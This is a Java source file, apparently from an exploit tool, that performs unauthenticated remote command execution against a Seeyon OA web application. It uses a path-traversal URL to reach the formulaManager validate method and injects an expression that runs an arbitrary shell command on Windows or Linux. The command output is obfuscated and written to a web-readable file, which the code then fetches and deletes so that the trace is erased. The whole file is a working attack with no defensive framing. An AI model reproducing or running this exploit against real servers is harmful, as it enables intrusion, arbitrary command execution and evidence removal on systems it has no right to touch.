import java.util.UUID;

public class ExecuteCode {
    public void ExecuteCode(String oaUrl,String cmd) throws Exception {
        HTTPClient httpClient = new HTTPClient();
        UUID uuid = UUID.randomUUID();
        String uuidStr = uuid.toString();
        uuidStr = uuidStr.replace("-", "");
        String realUrl = oaUrl + "/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip";
        String getUrl = oaUrl + "/" + uuidStr + ".txt";
        String uuidTxt = "../webapps/seeyon/" + uuidStr + ".txt";
        String winDel = "cd ../webapps/seeyon&del "+uuidStr+".txt";
        String linuxDel = "cd ../webapps/seeyon;rm -f " +uuidStr+".txt";
        //执行命令
        String execString = "[{'formulaType':1,'formulaName':'test','formulaExpression':'Properties prop = System.getProperties(); String os = prop.getProperty(\"os.name\");Process pc = null;if (os.startsWith(\"win\") || os.startsWith(\"Win\")){ProcessBuilder pb=new ProcessBuilder(\"cmd\",\"/c\",\"" + cmd + "\");pc =pb.start();}else{ProcessBuilder pb=new ProcessBuilder(\"/bin/sh\",\"-c\",\"" + cmd + "\");pc = pb.start();};java.io.BufferedReader br = new java.io.BufferedReader(new InputStreamReader(pc.getInputStream(),\"GBK\"));String line = \"\";StringBuilder sb = new StringBuilder();while((line = br.readLine())!=null){sb.append(line+\"\\\\n\");};br.close();String sbStr = sb.toString();sun.misc.BASE64Encoder encoder=new sun.misc.BASE64Encoder();byte[] enByte = sbStr.getBytes(\"UTF-8\");String enStr = encoder.encode(enByte);char[] enChar = enStr.toCharArray();String Base65 = \"\";for (int i=0;i<enChar.length;i++){ int intCh = (int)enChar[i]+1;Base65 = Base65 + Integer.toHexString(intCh); };java.io.FileWriter writer = new java.io.FileWriter(\""+uuidTxt+"\");writer.write(Base65);writer.flush();writer.close();};test();def static xxx(){'},'',{},'true']";
        System.out.println(execString);
        String execUrl = new Encoder().Encoder(execString);
        String execExp = "managerMethod=validate&arguments=" + execUrl;
        System.out.println(execExp);
        //删除命令回显文件
        String delString = "[{'formulaType':1,'formulaName':'test','formulaExpression':'Properties prop = System.getProperties(); String os = prop.getProperty(\"os.name\");if (os.startsWith(\"win\") || os.startsWith(\"Win\")){ProcessBuilder pb=new ProcessBuilder(\"cmd\",\"/c\",\""+winDel+"\");Process process = pb.start();}else{ProcessBuilder pb=new ProcessBuilder(\"/bin/sh\",\"-c\",\""+linuxDel+"\");Process process = pb.start();}};test();def static xxx(){'},'',{},'true']";
        String execDel = new Encoder().Encoder(delString);
        execDel = "managerMethod=validate&arguments=" + execDel;

        httpClient.sendPost(realUrl,execExp);
        Thread.sleep(2 * 1000);
        httpClient.getRes(getUrl);
        Thread.sleep(2 * 1000);
        httpClient.doDel(realUrl,execDel);
    }
}
